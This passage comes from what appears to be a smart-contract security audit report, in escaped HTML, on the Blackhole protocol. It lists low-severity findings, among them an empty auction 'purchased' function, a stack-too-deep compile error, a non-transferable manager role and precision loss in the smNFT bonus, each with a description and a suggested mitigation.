class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor the \u003ccode\u003eblacklistConnector\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBlacklistConnector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-incomplete-implementation-of-purchased-function-in-auction-contract\" style=\"position:relative;\"\u003e\u003ca href=\"#02-incomplete-implementation-of-purchased-function-in-auction-contract\" aria-label=\"02 incomplete implementation of purchased function in auction contract permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Incomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-14\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-14\" aria-label=\"finding description 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003epurchased\u003c/code\u003e function, intended to be called upon token purchases, is declared with an empty body in the deployed Auction contract. This results in the function call succeeding without performing any state updates, event emissions, or other side effects expected from purchase tracking.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epurchased\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// empty body\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince the function performs no operations, the auction contract does not update any internal state to reflect the purchase. This means the auction logic is incomplete.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement the purchased function with appropriate logic; however, the protocol intends to use this function.\u003c/p\u003e\n\u003ch2 id=\"03-stack-too-deep-error-in-inline-assembly-variable-headstart\" style=\"position:relative;\"\u003e\u003ca href=\"#03-stack-too-deep-error-in-inline-assembly-variable-headstart\" aria-label=\"03 stack too deep error in inline assembly variable headstart permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Stack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/h2\u003e\n\u003cp\u003eThe Solidity compiler enforces a limit of 16 stack slots for local variables and parameters within a function due to EVM constraints. When a function contains too many variables, especially combined with inline assembly code that requires stack slots, the compiler throws a “stack too deep” error. In this case, the variable \u003ccode\u003eheadStart\u003c/code\u003e could not be allocated a slot inside the stack because it was already too deep.\u003c/p\u003e\n\u003ch3 id=\"impact-14\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-14\" aria-label=\"impact 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCompilation Failure: The contract code cannot compile successfully, halting deployment and testing.\u003c/li\u003e\n\u003cli\u003eFunctionality Blocked: Critical functions that use this variable inside inline assembly cannot be deployed or used until the issue is resolved.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eMinimize Inline Assembly: Simplify or minimize the inline assembly code to use fewer variables or perform logic in Solidity instead.\u003c/p\u003e\n\u003ch2 id=\"04-hardcoded-manager-lacks-ability-to-renounce-control\" style=\"position:relative;\"\u003e\u003ca href=\"#04-hardcoded-manager-lacks-ability-to-renounce-control\" aria-label=\"04 hardcoded manager lacks ability to renounce control permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[04] Hardcoded manager lacks ability to renounce control\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-15\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-15\" aria-label=\"finding description 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe contract defines an \u003ccode\u003eonlyManager\u003c/code\u003e modifier that restricts access to certain functions exclusively to a hardcoded \u003ccode\u003egenesisManager\u003c/code\u003e address. However, there is no mechanism to transfer or renounce this privileged role, making it permanently tied to the initial deployer or assigned address.\u003c/p\u003e\n\u003ch3 id=\"impact-15\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-15\" aria-label=\"impact 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe absence of \u003ccode\u003etransferManager\u003c/code\u003e or \u003ccode\u003erenounceManager\u003c/code\u003e functions introduces centralization and governance risks. If the manager’s private key is lost, compromised, or becomes inactive, all functions guarded by \u003ccode\u003eonlyManager\u003c/code\u003e will become permanently unusable. \u003c/li\u003e\n\u003cli\u003eNo flexibility.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAllow the current manager to securely assign a new address:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZERO_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\" style=\"position:relative;\"\u003e\u003ca href=\"#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\" aria-label=\"05 precision loss in smnft bonus calculation may result in zero bonus when updating to smnft permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[05] Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1364\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-16\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-16\" aria-label=\"finding description 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003ecalculate_sm_nft_bonus\u003c/code\u003e function calculates a bonus amount for smNFT (Super Massive NFT) users based on a fixed bonus rate (\u003ccode\u003eSMNFT_BONUS\u003c/code\u003e) and a precision constant (\u003ccode\u003ePRECISISON\u003c/code\u003e). The formula used is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecalculate_sm_nft_bonus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){ \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSMNFT_BONUS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePRECISION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSMNFT_BONUS\u003c/code\u003e = 1000 and \u003ccode\u003ePRECISISON\u003c/code\u003e = 10000\u003c/p\u003e\n\u003cp\u003eThe function gives a 10% bonus. However, when updating to a smNFT and the current locked amount in the lock is low, it can lead to the user receiving zero bonus.\u003c/p\u003e\n\u003ch3 id=\"impact-16\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-16\" aria-label=\"impact 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eWhile the logic is correct, integer division in Solidity can lead to precision loss for small amounts. In particular:\u003c/p\u003e\n\u003cp\u003eFor amount = 9, the bonus becomes \u003ccode\u003e(1000 * 9) / 10000 = 9000 / 10000 = 0\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eUsers having small amounts in their 